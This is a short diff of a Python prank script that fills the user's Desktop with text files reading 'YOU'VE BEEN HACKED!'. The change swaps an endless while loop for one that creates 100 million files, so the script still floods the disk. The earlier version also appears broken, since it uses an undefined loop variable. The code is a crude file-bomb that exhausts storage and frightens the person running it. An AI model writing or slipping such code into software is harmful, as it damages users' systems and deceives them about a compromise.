@@ -8,9 +8,8 @@ from os.path import expanduser
 from os.path import join
 extension = str(".txt")
 name = ("spam") 
-painful = True
 
-while (painful):
+for i in range(100000000):
     file = open("Desktop/"+ name + str(i) + extension, "w")
     file.write("YOU'VE BEEN HACKED!")
     file.close()
